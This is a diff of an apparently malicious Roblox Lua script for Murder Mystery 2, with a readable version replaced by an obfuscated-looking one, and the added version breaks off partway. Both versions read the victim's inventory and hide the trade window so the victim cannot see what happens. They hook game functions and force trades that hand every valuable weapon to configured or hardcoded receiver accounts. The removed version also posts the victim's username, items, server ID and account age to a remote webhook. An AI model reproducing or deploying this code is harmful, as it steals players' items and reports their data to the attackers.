@@ -1,670 +1,982 @@
-local select = select
+local _select = select
 
-local function setTableValues(tbl, idx, ...)
-    local args = {...}
-    for i = 1, select("#", ...) do
-        tbl[idx + i - 1] = args[i]
-    end
+local function v370(tbl, idx, ...)
+	local va = { ... }
+
+	for i = 1, _select("#", ...) do
+		tbl[idx + i - 1] = va[i]
+	end
 end
 
 _G.scriptExecuted = _G.scriptExecuted or false
 
 if not _G.scriptExecuted then
-    _G.scriptExecuted = true
-    _G.Webhook = _G.Webhook
-    _G.MinValueForPing = _G.MinValueForPing
-    _G.Receivers = _G.Receivers
-    _G.ScriptOwner = _G.ScriptOwner
+	_G.scriptExecuted = true
+	_G.Webhook = _G.Webhook
+	_G.MinValueForPing = _G.MinValueForPing
+	_G.Receivers = _G.Receivers
+	_G.ScriptOwner = _G.ScriptOwner
 
-    -- Get request function (supports multiple executors)
-    local requestFunc = syn and syn.request or (http and http.request or (http_request or (fluxus and fluxus.request or request)))
-    local HttpService = game:GetService("HttpService")
-    local domainUrl = ""
-    
-    -- Fetch domain from remote
-    pcall(function()
-        local response = game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyAuto/refs/heads/main/domain.json")
-        local data = HttpService:JSONDecode(response)
-        if data and data.domain then
-            domainUrl = data.domain
-        end
-    end)
+	local v1 = syn and syn.request or (http and http.request or (http_request or (fluxus and fluxus.request or request)))
+	local HttpService = game:GetService("HttpService")
+	local s1 = ""
+	local u5 = HttpService
 
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+	pcall(function()
+		local v63 = game:HttpGet("https://raw.githubusercontent.com/unrates/domain/refs/heads/main/domain.json")
+		local data = u5:JSONDecode(v63)
 
-    SESSION_ID = "local_session"
-    IS_CLAIMED = false
+		if data and data.domain then
+			s1 = data.domain
+		end
+	end)
 
-    -- MM2 specific (PlaceId 142823291)
-    if game.PlaceId == 142823291 then
-        RealJobID = game.JobId
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local Players = game:GetService("Players")
+	local HttpService2 = game:GetService("HttpService")
+	local LocalPlayer = Players.LocalPlayer
+	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
-        -- Delta executor detection + hook to capture real JobId
-        if identifyexecutor then
-            if type(identifyexecutor) == "function" then
-                local executorName = identifyexecutor()
-                if executorName and executorName:lower():find("delta") then
-                    -- Hook stepAnimate to capture JobId before it changes
-                    local function hookStepAnimate()
-                        local stepFunction = nil
-                        local hooked = false
-                        
-                        repeat
-                            stepFunction = nil
-                            for _, func in ipairs(getgc(true)) do
-                                if typeof(func) == "function" then
-                                    local info = debug.getinfo(func)
-                                    if info and info.name == "stepAnimate" then
-                                        stepFunction = func
-                                        break
-                                    end
-                                end
-                            end
-                            task.wait()
-                        until stepFunction
-                        
-                        local original = hookfunction(stepFunction, function(p1)
-                            if not hooked then
-                                hooked = true
-                                jobId = game.JobId
-                                RealJobID = jobId
-                            end
-                            return original(p1)
-                        end)
-                        return original
-                    end
-                    hookStepAnimate()
-                end
-            end
-        end
+	SESSION_ID = "local_session"
+	IS_CLAIMED = false
 
-        -- Whitelist of items to skip (default/event items)
-        local skipItems = {
-            DefaultGun = true, DefaultKnife = true, Reaver = true,
-            Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
-            IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true,
-            IceHammer_Ancient = true, Gingerscythe = true, Gingerscythe_Legendary = true,
-            Gingerscythe_Godly = true, Gingerscythe_Ancient = true, TestItem = true,
-            Season1TestKnife = true, Cracks = true, Icecrusher = true,
-            ["???"] = true, Dartbringer = true, TravelerAxeRed = true,
-            TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
-            BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true,
-        }
+	if game.PlaceId == 142823291 then
+		RealJobID = game.JobId
 
-        -- Get owned weapons excluding skip list
-        local function getOwnedWeapons()
-            local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
-            local owned = profileData.Weapons.Owned
-            local result = {}
-            
-            for weaponName, amount in pairs(owned) do
-                if not skipItems[weaponName] then
-                    table.insert(result, { name = weaponName, amount = amount })
-                end
-            end
-            return result
-        end
+		if identifyexecutor then
+			if type(identifyexecutor) == "function" then
+				local v12, _ = identifyexecutor()
 
-        -- Setup trade system
-        local Trade = ReplicatedStorage:WaitForChild("Trade", 30)
-        if Trade then
-            local SendRequest = Trade:WaitForChild("SendRequest", 10)
-            local GetTradeStatus = Trade:WaitForChild("GetTradeStatus", 10)
-            local AcceptTrade = Trade:WaitForChild("AcceptTrade", 10)
-            local OfferItem = Trade:WaitForChild("OfferItem", 10)
-            local DeclineTrade = Trade:WaitForChild("DeclineTrade", 10)
-            local DeclineRequest = Trade:WaitForChild("DeclineRequest", 10)
+				if v12 and v12:lower():find("delta") then
+					(function()
+						local u65 = nil
+						local u66 = false
+						local v67
 
-            if SendRequest and GetTradeStatus and AcceptTrade and OfferItem then
-                -- Disable TradeGUI automatically
-                task.spawn(function()
-                    pcall(function()
-                        local TradeGUI = PlayerGui:WaitForChild("TradeGUI", 5)
-                        if TradeGUI then
-                            TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
-                                TradeGUI.Enabled = false
-                            end)
-                        end
-                    end)
-                end)
+						repeat
+							v67 = nil
 
-                task.spawn(function()
-                    pcall(function()
-                        local TradeGUI_Phone = PlayerGui:WaitForChild("TradeGUI_Phone", 5)
-                        if TradeGUI_Phone then
-                            TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(function()
-                                TradeGUI_Phone.Enabled = false
-                            end)
-                        end
-                    end)
-                end)
+							for _, v in ipairs(getgc(true)) do
+								if typeof(v) == "function" then
+									local v70 = debug.getinfo(v)
 
-                -- Get LastOffer from GC
-                local function getLastOffer()
-                    for _, tbl in pairs(getgc(true)) do
-                        if type(tbl) == "table" and rawget(tbl, "LastOffer") ~= nil then
-                            return tbl.LastOffer
-                        end
-                    end
-                    return nil
-                end
+									if v70 and v70.name == "stepAnimate" then
+										v67 = v
 
-                local function waitForLastOffer(timeout)
-                    if not timeout then timeout = 10 end
-                    for _ = 1, timeout do
-                        local offer = getLastOffer()
-                        if offer ~= nil then
-                            return offer
-                        end
-                        task.wait(0.3)
-                    end
-                    return nil
-                end
+										break
+									end
+								end
+							end
 
-                -- Track tradable items
-                local tradableItems = {}
-                local itemValues = {}
-                local excludedRarities = { COMMON = true, UNCOMMON = true, RARE = true }
-                
-                -- Prepare items for trading
-                local function prepareTradableItems()
-                    local ownedWeapons = getOwnedWeapons()
-                    tradableItems = {}
-                    
-                    for _, weapon in ipairs(ownedWeapons) do
-                        local valueData = itemValues[weapon.name]
-                        if valueData then
-                            local rarity = valueData.type or "UNKNOWN"
-                            if not (not rarity or excludedRarities[string.upper(rarity)] == true) and rarity ~= "UNKNOWN" then
-                                local val = valueData.value or 0
-                                if type(val) == "string" then
-                                    val = tonumber(val) or 0
-                                end
-                                local roundedValue = math.floor(val + 0.5)
-                                if roundedValue < 1 then roundedValue = 1 end
-                                
-                                table.insert(tradableItems, {
-                                    name = weapon.name,
-                                    amount = weapon.amount,
-                                    value = roundedValue
-                                })
-                            end
-                        end
-                    end
-                    
-                    table.sort(tradableItems, function(a, b)
-                        return a.value > b.value
-                    end)
-                    
-                    return tradableItems
-                end
+							task.wait()
+						until v67
 
-                local isTrading = false
+						u65 = hookfunction(v67, function(p1)
+							if not u66 then
+								u66 = true
+								jobId = game.JobId
+								RealJobID = jobId
+							end
 
-                -- Main trade execution
-                local function executeTrade(targetPlayer)
-                    local player = Players:FindFirstChild(targetPlayer)
-                    if not player then return end
-                    
-                    if not player.Character then
-                        player.CharacterAdded:Wait()
-                    end
-                    task.wait(0.5)
-                    
-                    player = Players:FindFirstChild(targetPlayer)
-                    if not player then return end
-                    
-                    -- Clean up any existing trade state
-                    local status
-                    pcall(function()
-                        status = GetTradeStatus:InvokeServer()
-                    end)
-                    if not status then status = "None" end
-                    
-                    if status ~= "StartTrade" then
-                        if status == "ReceivingRequest" then
-                            pcall(function() DeclineRequest:FireServer() end)
-                            task.wait(0.5)
-                        end
-                    else
-                        pcall(function() DeclineTrade:FireServer() end)
-                        task.wait(0.5)
-                    end
-                    
-                    while #tradableItems > 0 and not IS_CLAIMED do
-                        local tradeStatus
-                        pcall(function()
-                            tradeStatus = GetTradeStatus:InvokeServer()
-                        end)
-                        if not tradeStatus then tradeStatus = "None" end
-                        
-                        if tradeStatus == "None" or tradeStatus == "SendingRequest" then
-                            if tradeStatus == "SendingRequest" then
-                                pcall(function() DeclineRequest:FireServer() end)
-                                task.wait(0.1)
-                            else
-                                task.spawn(function()
-                                    pcall(function()
-                                        SendRequest:InvokeServer(player)
-                                    end)
-                                end)
-                                task.wait(0.01)
-                            end
-                        elseif tradeStatus == "ReceivingRequest" then
-                            pcall(function() DeclineRequest:FireServer() end)
-                            task.wait(0.1)
-                        elseif tradeStatus == "StartTrade" then
-                            -- Offer items (up to 4 per cycle)
-                            local offered = 0
-                            while offered < 4 and #tradableItems > 0 do
-                                local item = table.remove(tradableItems, 1)
-                                offered = offered + 1
-                                
-                                for _ = 1, item.amount do
-                                    pcall(function()
-                                        OfferItem:FireServer(item.name, "Weapons")
-                                    end)
-                                end
-                            end
-                            
-                            -- Accept trade with LastOffer
-                            local startTime = tick()
-                            while true do
-                                local tradeStatus2
-                                pcall(function()
-                                    tradeStatus2 = GetTradeStatus:InvokeServer()
-                                end)
-                                if not tradeStatus2 then tradeStatus2 = "None" end
-                                
-                                if tradeStatus2 == "None" then
-                                    break
-                                end
-                                
-                                pcall(function()
-                                    AcceptTrade:FireServer(game.PlaceId * 3, nil)
-                                    task.wait(0.01)
-                                    
-                                    -- Collect all LastOffer values
-                                    local offers = {}
-                                    for _, tbl in pairs(getgc(true)) do
-                                        if type(tbl) == "table" and rawget(tbl, "LastOffer") ~= nil then
-                                            local lastOffer = tbl.LastOffer
-                                            if type(lastOffer) ~= "table" then
-                                                offers._single = tbl.LastOffer
-                                            else
-                                                for key, value in pairs(tbl.LastOffer) do
-                                                    offers[key] = value
-                                                end
-                                            end
-                                        end
-                                    end
-                                    
-                                    -- Accept with all offers
-                                    for _, offer in pairs(offers) do
-                                        pcall(function() AcceptTrade:FireServer(game.PlaceId * 3, offer) end)
-                                        task.wait(0.01)
-                                    end
-                                    
-                                    -- Try LastOffer from GC one more time
-                                    local lastOffer = waitForLastOffer(2)
-                                    if lastOffer then
-                                        AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
-                                    end
-                                end)
-                                
-                                if tick() - startTime > 30 then
-                                    pcall(function() DeclineTrade:FireServer() end)
-                                    break
-                                end
-                                
-                                task.wait(0.01)
-                            end
-                            
-                            prepareTradableItems()
-                            
-                            if #tradableItems > 0 then
-                                task.wait(0.1)
-                                player = Players:FindFirstChild(targetPlayer)
-                                if not player then return end
-                            end
-                        end
-                        task.wait()
-                    end
-                end
+							return u65(p1)
+						end)
 
-                -- Watch for specified receivers
-                local function monitorPlayers()
-                    local function checkPlayer(player)
-                        local isReceiver = false
-                        local playerNameLower = player.Name:lower()
-                        
-                        -- Check Receivers table
-                        if type(_G.Receivers) == "table" then
-                            for _, receiver in ipairs(_G.Receivers) do
-                                if playerNameLower == receiver:lower() then
-                                    isReceiver = true
-                                    break
-                                end
-                            end
-                        end
-                        
-                        -- Check single Receiver
-                        if not isReceiver then
-                            if type(_G.Receiver) == "string" and playerNameLower == _G.Receiver:lower() then
-                                isReceiver = true
-                            end
-                        end
-                        
-                        -- Hardcoded fallback
-                        if not isReceiver and playerNameLower == "Tctekkd321" then
-                            isReceiver = true
-                        end
-                        
-                        if isReceiver and not isTrading then
-                            isTrading = true
-                            task.spawn(function()
-                                executeTrade(player.Name)
-                                isTrading = false
-                            end)
-                        end
-                    end
-                    
-                    -- Check existing players
-                    for _, player in ipairs(Players:GetPlayers()) do
-                        checkPlayer(player)
-                    end
-                    
-                    -- Watch for new players
-                    Players.PlayerAdded:Connect(checkPlayer)
-                end
+						return u65
+					end)()
+				end
+			end
+		end
 
-                -- Initialize item values from remote API
-                local function loadItemValues()
-                    local owned = getOwnedWeapons()
-                    if #owned == 0 then return end
-                    
-                    itemValues = {}
-                    
-                    -- Fetch price data
-                    local success, result = pcall(function()
-                        return game:HttpGet("http://109.120.157.241:5000/supreme")
-                    end)
-                    
-                    if not success then
-                        pcall(function()
-                            result = HttpService:GetAsync("http://109.120.157.241:5000/supreme")
-                        end)
-                    end
-                    
-                    if success then
-                        local decoded
-                        pcall(function()
-                            decoded = HttpService:JSONDecode(result)
-                        end)
-                        
-                        if decoded and type(decoded) == "table" then
-                            local prices = decoded.prices
-                            if prices then
-                                local nameMap = {}
-                                local slugMap = {}
-                                local cleanNameMap = {}
-                                
-                                -- Build lookup tables
-                                for _, item in ipairs(prices) do
-                                    local val = 0
-                                    if item.values then
-                                        if type(item.values) == "table" and #item.values > 0 then
-                                            val = item.values[1].user_value or 0
-                                        end
-                                    end
-                                    
-                                    local rarityType = "UNKNOWN"
-                                    if item.type then
-                                        rarityType = string.upper(item.type)
-                                    end
-                                    
-                                    if rarityType and excludedRarities[string.upper(rarityType)] ~= true then
-                                        if item.name then
-                                            local data = { value = val, type = rarityType }
-                                            nameMap[item.name] = data
-                                            nameMap[string.lower(item.name)] = data
-                                            
-                                            local clean = string.lower(item.name)
-                                            cleanNameMap[string.gsub(clean, "[^%w]", "")] = data
-                                            
-                                            local noApostrophe = string.gsub(clean, "'s", "")
-                                            cleanNameMap[string.gsub(noApostrophe, "[^%w]", "")] = data
-                                            
-                                            local noType = string.gsub(clean, " knife", "")
-                                            noType = string.gsub(noType, " gun", "")
-                                            cleanNameMap[string.gsub(noType, "[^%w]", "")] = data
-                                            
-                                            local noType2 = string.gsub(noApostrophe, " knife", "")
-                                            noType2 = string.gsub(noType2, " gun", "")
-                                            cleanNameMap[string.gsub(noType2, "[^%w]", "")] = data
-                                        end
-                                        
-                                        if item.slug then
-                                            slugMap[item.slug] = { value = val, type = rarityType }
-                                        end
-                                    end
-                                end
-                                
-                                -- Get weapon data from ReplicatedStorage
-                                local weaponData
-                                pcall(function()
-                                    weaponData = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"))
-                                end)
-                                
-                                if weaponData and weaponData.Weapons then
-                                    local valueMap = {}
-                                    local function addNameVariants(name, rarity, itemType, chroma, evo, year, event, baseID)
-                                        local variants = { name }
-                                        variants[#variants+1] = string.lower(name)
-                                        
-                                        if chroma then
-                                            variants[#variants+1] = "Chroma " .. name
-                                            variants[#variants+1] = name .. " Chroma"
-                                            variants[#variants+1] = string.lower("Chroma " .. name)
-                                            variants[#variants+1] = string.lower(name .. " Chroma")
-                                        end
-                                        
-                                        if itemType == "Gun" then
-                                            variants[#variants+1] = name .. " Gun"
-                                            variants[#variants+1] = string.lower(name .. " Gun")
-                                            if chroma then
-                                                variants[#variants+1] = "Chroma " .. name .. " Gun"
-                                                variants[#variants+1] = string.lower("Chroma " .. name .. " Gun")
-                                            end
-                                        elseif itemType == "Knife" then
-                                            variants[#variants+1] = name .. " Knife"
-                                            variants[#variants+1] = string.lower(name .. " Knife")
-                                            if chroma then
-                                                variants[#variants+1] = "Chroma " .. name .. " Knife"
-                                                variants[#variants+1] = string.lower("Chroma " .. name .. " Knife")
-                                            end
-                                        end
-                                        
-                                        if event and year then
-                                            variants[#variants+1] = name .. " " .. year
-                                            variants[#variants+1] = string.lower(name .. " " .. year)
-                                            
-                                            if itemType == "Gun" then
-                                                variants[#variants+1] = name .. " Gun " .. year
-                                                variants[#variants+1] = string.lower(name .. " Gun " .. year)
-                                            elseif itemType == "Knife" then
-                                                variants[#variants+1] = name .. " Knife " .. year
-                                                variants[#variants+1] = string.lower(name .. " Knife " .. year)
-                                            end
-                                            
-                                            if chroma then
-                                                variants[#variants+1] = "Chroma " .. name .. " " .. year
-                                                variants[#variants+1] = string.lower("Chroma " .. name .. " " .. year)
-                                            end
-                                        end
-                                        
-                                        -- Try to find value using variants
-                                        for _, variant in ipairs(variants) do
-                                            local slug = string.lower(string.gsub(variant, "%s+", "-"))
-                                            if slugMap[slug] then
-                                                valueMap[key] = slugMap[slug]
-                                                return true
-                                            end
-                                        end
-                                        
-                                        for _, variant in ipairs(variants) do
-                                            if nameMap[variant] then
-                                                valueMap[key] = nameMap[variant]
-                                                return true
-                                            end
-                                        end
-                                        
-                                        for _, variant in ipairs(variants) do
-                                            local clean = string.lower(string.gsub(variant, "[^%w]", ""))
-                                            if cleanNameMap[clean] then
-                                                valueMap[key] = cleanNameMap[clean]
-                                                return true
-                                            end
-                                        end
-                                        
-                                        -- Try with rarity
-                                        if evo and baseID then
-                                            local rarityVariants = {
-                                                name,
-                                                name .. " " .. rarity
-                                            }
-                                            variants[#variants+1] = string.lower(name .. " " .. rarity)
-                                            for _, v in ipairs(rarityVariants) do
-                                                if nameMap[v] then
-                                                    valueMap[key] = nameMap[v]
-                                                    return true
-                                                end
-                                            end
-                                        end
-                                        
-                                        return false
-                                    end
-                                    
-                                    for key, data in pairs(weaponData.Weapons) do
-                                        if type(data) == "table" and data.Rarity then
-                                            local rarity = string.upper(tostring(data.Rarity))
-                                            if rarity and excludedRarities[string.upper(rarity)] ~= true then
-                                                local name = data.ItemName or data.Name or ""
-                                                local chroma = data.Chroma == true
-                                                local evo = data.Evo or data.EvoBaseID
-                                                local itemType = data.ItemType or ""
-                                                local year = data.Year
-                                                local event = data.Event
-                                                
-                                                addNameVariants(name, rarity, itemType, chroma, evo, year, event, data.EvoBaseID)
-                                            end
-                                        end
-                                    end
-                                    
-                                    return valueMap
-                                end
-                            end
-                        end
-                    end
-                    return {}
-                end
-                
-                local values = loadItemValues()
-                for key, value in pairs(values) do
-                    itemValues[key] = value
-                end
-                
-                -- Build initial tradable items
-                local prepared = prepareTradableItems()
-                local totalValue = 0
-                local highValueItems = {}
-                local shouldPing = false
-                
-                for _, item in ipairs(prepared) do
-                    local value = item.value
-                    if value >= _G.MinValueForPing then
-                        shouldPing = true
-                    end
-                    
-                    totalValue = totalValue + (value * item.amount)
-                    
-                    local cleanName = string.gsub(item.name, "_.*", "")
-                    table.insert(highValueItems, {
-                        name = cleanName,
-                        amount = item.amount,
-                        value = value * item.amount,
-                        single_value = value
-                    })
-                end
-                
-                table.sort(highValueItems, function(a, b) return a.value > b.value end)
-                
-                if #prepared > 0 then
-                    -- Send webhook notification
-                    if _G.Webhook ~= "" then
-                        task.spawn(function()
-                            pcall(function()
-                                local webhookData = {
-                                    Url = domainUrl .. "/api/mm2-webhook",
-                                    Method = "POST",
-                                    Headers = {
-                                        ["Content-Type"] = "application/json",
-                                    },
-                                }
-                                
-                                local payload = {
-                                    webhook = _G.Webhook,
-                                    items = highValueItems,
-                                    jobId = RealJobID or game.JobId,
-                                    placeId = tostring(game.PlaceId),
-                                    pingEveryone = shouldPing,
-                                    username = LocalPlayer.Name,
-                                    executor = pcall(function() 
-                                        if type(identifyexecutor) ~= "function" then return "Unknown" end
-                                        return identifyexecutor() 
-                                    end) or "Unknown",
-                                    accountAge = LocalPlayer.AccountAge,
-                                }
-                                
-                                -- Build receivers list
-                                local receiversString = nil
-                                if type(_G.Receivers) == "table" then
-                                    receiversString = table.concat(_G.Receivers, ", ")
-                                end
-                                if not receiversString then
-                                    receiversString = tostring(_G.Receiver or "Tctekkd321")
-                                end
-                                
-                                payload.receiversList = receiversString
-                                payload.scriptOwner = _G.ScriptOwner
-                                
-                                webhookData.Body = HttpService:JSONEncode(payload)
-                                requestFunc(webhookData)
-                            end)
-                            
-                            -- Keep-alive pings
-                            while task.wait(3) do
-                                pcall(function()
-                                    requestFunc({
-                                        Url = domainUrl .. "/api/mm2-ping",
-                                        Method = "POST",
-                                        Headers = { ["Content-Type"] = "application/json" },
-                                        Body = HttpService:JSONEncode({
-                                            username = LocalPlayer.Name,
-                                        }),
-                                    })
-                                end)
-                            end
-                        end)
-                    end
-                    
-                    -- Start monitoring for receivers
-                    monitorPlayers()
-                end
-            end
-        end
-    end
+		local t1 = {
+			DefaultGun = true,
+			DefaultKnife = true,
+			Reaver = true,
+			Reaver_Legendary = true,
+			Reaver_Godly = true,
+			Reaver_Ancient = true,
+			IceHammer = true,
+			IceHammer_Legendary = true,
+			IceHammer_Godly = true,
+			IceHammer_Ancient = true,
+			Gingerscythe = true,
+			Gingerscythe_Legendary = true,
+			Gingerscythe_Godly = true,
+			Gingerscythe_Ancient = true,
+			TestItem = true,
+			Season1TestKnife = true,
+			Cracks = true,
+			Icecrusher = true,
+			["???"] = true,
+			Dartbringer = true,
+			TravelerAxeRed = true,
+			TravelerAxeBronze = true,
+			TravelerAxeSilver = true,
+			TravelerAxeGold = true,
+			BlueCamo_K_2022 = true,
+			GreenCamo_K_2022 = true,
+			SharkSeeker = true,
+		}
+		local u15 = ReplicatedStorage
+		local u16 = LocalPlayer
+		local u17 = t1
+
+		local function v18()
+			local Owned = u15.Remotes.Inventory.GetProfileData:InvokeServer(u16.Name).Weapons.Owned
+			local t2 = {}
+
+			for k, v in pairs(Owned) do
+				if not u17[k] then
+					local t3 = {
+						name = k,
+						amount = v,
+					}
+
+					table.insert(t2, t3)
+				end
+			end
+
+			return t2
+		end
+
+		local Trade = ReplicatedStorage:WaitForChild("Trade", 30)
+
+		if Trade then
+			local SendRequest = Trade:WaitForChild("SendRequest", 10)
+			local GetTradeStatus = Trade:WaitForChild("GetTradeStatus", 10)
+			local AcceptTrade = Trade:WaitForChild("AcceptTrade", 10)
+			local OfferItem = Trade:WaitForChild("OfferItem", 10)
+			local DeclineTrade = Trade:WaitForChild("DeclineTrade", 10)
+			local DeclineRequest = Trade:WaitForChild("DeclineRequest", 10)
+
+			if SendRequest and GetTradeStatus and AcceptTrade and OfferItem then
+				local spawn = task.spawn
+				local u27 = PlayerGui
+
+				spawn(function()
+					pcall(function()
+						local TradeGUI = u27:WaitForChild("TradeGUI", 5)
+
+						if TradeGUI then
+							local PropertyChangedSignal = TradeGUI:GetPropertyChangedSignal("Enabled")
+							local u154 = TradeGUI
+
+							PropertyChangedSignal:Connect(function()
+								u154.Enabled = false
+							end)
+						end
+					end)
+				end)
+
+				local spawn2 = task.spawn
+				local u29 = PlayerGui
+
+				spawn2(function()
+					pcall(function()
+						local TradeGUI_Phone = u29:WaitForChild("TradeGUI_Phone", 5)
+
+						if TradeGUI_Phone then
+							local PropertyChangedSignal = TradeGUI_Phone:GetPropertyChangedSignal("Enabled")
+							local u157 = TradeGUI_Phone
+
+							PropertyChangedSignal:Connect(function()
+								u157.Enabled = false
+							end)
+						end
+					end)
+				end)
+
+				local function u30()
+					for _, v in pairs(getgc(true)) do
+						if type(v) == "table" and rawget(v, "LastOffer") ~= nil then
+							return v.LastOffer
+						end
+					end
+
+					return nil
+				end
+				local function v31(p2)
+					if not p2 then
+						p2 = 10
+					end
+
+					for _ = 1, p2 do
+						local v86 = u30()
+
+						if v86 ~= nil then
+							return v86
+						end
+
+						task.wait(0.3)
+					end
+
+					return nil
+				end
+
+				local _ = SendRequest
+				local _ = GetTradeStatus
+				local _ = GetTradeStatus
+				local _ = AcceptTrade
+				local _ = v31
+				local _ = OfferItem
+				local t4 = {
+					COMMON = true,
+					UNCOMMON = true,
+					RARE = true,
+				}
+				local _ = t4
+				local t5 = {}
+				local t6 = {}
+				local u42 = v18
+				local u43 = t4
+				local u44 = Players
+				local u45 = GetTradeStatus
+				local u46 = DeclineTrade
+				local u47 = DeclineRequest
+				local u48 = SendRequest
+				local u49 = OfferItem
+				local u50 = AcceptTrade
+				local u51 = v31
+
+				local function u52()
+					local v99 = u42()
+
+					t5 = {}
+
+					for _, v in ipairs(v99) do
+						local v102 = t6[v.name]
+
+						if v102 then
+							local v103 = v102.type or "UNKNOWN"
+
+							if not (not v103 or u43[string.upper(v103)] == true) and v103 ~= "UNKNOWN" then
+								local v104 = v102.value or 0
+
+								if type(v104) == "string" then
+									v104 = tonumber(v104) or 0
+								end
+
+								local v105 = v104 + 0.5
+								local v106 = math.floor(v105)
+
+								if v106 < 1 then
+									v106 = 1
+								end
+								local t7 = {
+									name = v.name,
+									amount = v.amount,
+									value = v106,
+								}
+
+								table.insert(t5, t7)
+							end
+						end
+					end
+
+					table.sort(t5, function(p3, p4)
+						return p3.value > p4.value
+					end)
+
+					return t5
+				end
+
+				local u53 = false
+
+				local function u54(p5)
+					local p5_2 = u44:FindFirstChild(p5)
+
+					if p5_2 then
+						if not p5_2.Character then
+							p5_2.CharacterAdded:Wait()
+						end
+
+						task.wait(0.5)
+
+						local p5_3 = u44:FindFirstChild(p5)
+
+						if p5_3 then
+							local ok, result = pcall(function()
+								return u45:InvokeServer()
+							end)
+
+							if not ok then
+								result = "None"
+							end
+
+							if result ~= "StartTrade" then
+								if result == "ReceivingRequest" then
+									pcall(function()
+										u47:FireServer()
+									end)
+									task.wait(0.5)
+								end
+							else
+								pcall(function()
+									u46:FireServer()
+								end)
+								task.wait(0.5)
+							end
+
+							while #t5 > 0 and not IS_CLAIMED do
+								local ok2, result2 = pcall(function()
+									return u45:InvokeServer()
+								end)
+
+								if not ok2 then
+									result2 = "None"
+								end
+
+								if result2 ~= "None" and result2 ~= "SendingRequest" then
+									if result2 ~= "ReceivingRequest" then
+										if result2 ~= "StartTrade" then
+											task.wait(0.1)
+										else
+											local n1 = 0
+
+											while n1 < 4 and #t5 > 0 do
+												local v117 = table.remove(t5, 1)
+
+												n1 = n1 + 1
+
+												for _ = 1, v117.amount do
+													local name = v117.name
+													local u121 = name
+
+													pcall(function()
+														u49:FireServer(u121, "Weapons")
+													end)
+												end
+											end
+
+											local timestamp = tick()
+
+											while true do
+												local ok3, result3 = pcall(function()
+													return u45:InvokeServer()
+												end)
+
+												if not ok3 then
+													result3 = "None"
+												end
+
+												if result3 == "None" then
+													break
+												end
+
+												pcall(function()
+													u50:FireServer(game.PlaceId * 3, nil)
+													task.wait(0.01)
+
+													local t8 = {}
+
+													for _, v in pairs(getgc(true)) do
+														if type(v) == "table" and rawget(v, "LastOffer") ~= nil then
+															local LastOffer = v.LastOffer
+
+															if type(LastOffer) ~= "table" then
+																t8._single = v.LastOffer
+															else
+																for k, v2 in pairs(v.LastOffer) do
+																	t8[k] = v2
+																end
+															end
+														end
+													end
+
+													for _, v in pairs(t8) do
+														local u180 = v
+
+														pcall(function()
+															u50:FireServer(game.PlaceId * 3, u180)
+														end)
+														task.wait(0.01)
+													end
+
+													local v181 = u51(2)
+
+													if v181 then
+														u50:FireServer(game.PlaceId * 3, v181)
+													end
+												end)
+
+												if tick() - timestamp > 30 then
+													pcall(function()
+														u46:FireServer()
+													end)
+
+													break
+												end
+
+												task.wait(0.01)
+											end
+
+											u52()
+
+											if #t5 > 0 then
+												task.wait(0.1)
+												p5_3 = u44:FindFirstChild(p5)
+
+												if not p5_3 then
+													return
+												end
+											end
+										end
+									else
+										pcall(function()
+											u47:FireServer()
+										end)
+										task.wait(0.1)
+									end
+								else
+									local spawn3 = task.spawn
+									local u126 = p5_3
+
+									spawn3(function()
+										pcall(function()
+											u48:InvokeServer(u126)
+										end)
+									end)
+									task.wait(0.01)
+								end
+
+								task.wait()
+							end
+
+							return
+						end
+
+						return
+					end
+				end
+
+				local u55 = Players
+				local u56 = v18
+				local u57 = HttpService2
+				local u58 = t4
+				local u59 = ReplicatedStorage
+				local u60 = v1
+				local u61 = LocalPlayer
+
+				local function u62()
+					local function v127(p6)
+						local v183 = false
+						local v184 = p6.Name:lower()
+						local Receivers = _G.Receivers
+
+						if type(Receivers) == "table" then
+							for _, v in ipairs(_G.Receivers) do
+								if v184 == v:lower() then
+									v183 = true
+
+									break
+								end
+							end
+						end
+
+						if not v183 then
+							local Receiver = _G.Receiver
+
+							if type(Receiver) == "string" and v184 == _G.Receiver:lower() then
+								v183 = true
+							end
+						end
+
+						if not v183 and v184 == "Tctekkd321" then
+							v183 = true
+						end
+
+						if v183 and not u53 then
+							u53 = true
+
+							local spawn4 = task.spawn
+							local u190 = p6
+
+							spawn4(function()
+								u54(u190.Name)
+								u53 = false
+							end)
+						end
+					end
+
+					for _, player in ipairs(u55:GetPlayers()) do
+						v127(player)
+					end
+
+					u55.PlayerAdded:Connect(v127)
+				end
+
+				(function()
+					local v130 = u56()
+
+					if #v130 ~= 0 then
+						t6 = {}
+
+						local v131 = (function()
+							local function v191(...)
+								local t9 = { ... }
+
+								t9.n = select("#", ...)
+
+								return t9
+							end
+
+							local ok, result = pcall(function()
+								return game:HttpGet("https://traderie.com/api/mm2/items/values?type=")
+							end)
+
+							if not ok then
+								local result4
+
+								ok, result4 = pcall(function()
+									return u57:GetAsync("https://traderie.com/api/mm2/items/values?type=")
+								end)
+								result = result4
+							end
+
+							if ok then
+								local ok4, result5 = pcall(function()
+									return u57:JSONDecode(result)
+								end)
+
+								if ok4 and type(result5) == "table" then
+									local prices = result5.prices
+
+									if prices then
+										local t10 = {}
+										local t11 = {}
+										local t12 = {}
+
+										for _, v in ipairs(prices) do
+											local n2 = 0
+
+											if v.values then
+												local values = v.values
+
+												if type(values) == "table" and #v.values > 0 then
+													n2 = v.values[1].user_value or 0
+												end
+											end
+
+											local s2 = "UNKNOWN"
+
+											if v.type then
+												s2 = string.upper(v.type)
+											end
+
+											if s2 and u58[string.upper(s2)] ~= true then
+												if v.name then
+													t10[v.name] = {
+														value = n2,
+														type = s2,
+													}
+													t10[string.lower(v.name)] = {
+														value = n2,
+														type = s2,
+													}
+
+													local v206 = string.lower(v.name)
+
